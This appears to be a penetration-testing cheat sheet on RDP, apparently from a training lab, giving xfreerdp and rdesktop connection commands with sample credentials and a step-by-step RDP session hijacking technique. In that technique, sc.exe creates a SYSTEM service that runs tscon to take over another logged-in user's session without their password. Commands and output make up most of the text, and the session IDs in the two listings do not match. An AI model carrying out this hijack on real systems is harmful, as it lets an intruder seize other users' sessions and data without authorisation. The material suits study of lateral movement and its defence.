# Ports
TCP/3389
# Clients
```shell
xfreerdp /v:STMIP /u:Administrator /p:'87N1ns@slls83' /dynamic-resolution
```

```bash
rdesktop -u admin -p password123 192.168.2.143
```
# RDP Session Hijacking
_Note: This method no longer works on Server 2019.

We are logged in as the user juurena (UserID = 2) who has Administrator privileges. Our goal is to hijack the user lewen (User ID = 4), who is also logged in via RDP.
```powershell
whoami

superstore\juurena

query user

username   sesseionname    id
juurena    rdp-tcp#13      2
lewen      rdp-tcp#14      4
```
To successfully impersonate a user without their password, we need to have `SYSTEM` privileges and use the Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary that enables users to connect to another desktop session.
```powershell
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```
iIf we have local administrator privileges, we can use several methods to obtain `SYSTEM` privileges, such as [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) or [Mimikatz](https://github.com/gentilkiwi/mimikatz). A simple trick is to create a Windows service that, by default, will run as `Local System` and will execute any binary with `SYSTEM` privileges. We will use [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) binary. First, we specify the service name (`sessionhijack`) and the `binpath`, which is the command we want to execute. Once we run the following command, a service named `sessionhijack` will be created.
```cmd
 query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```

```cmd
net start sessionhijack
```
Once the service is started, a new terminal with the `lewen` user session will appear
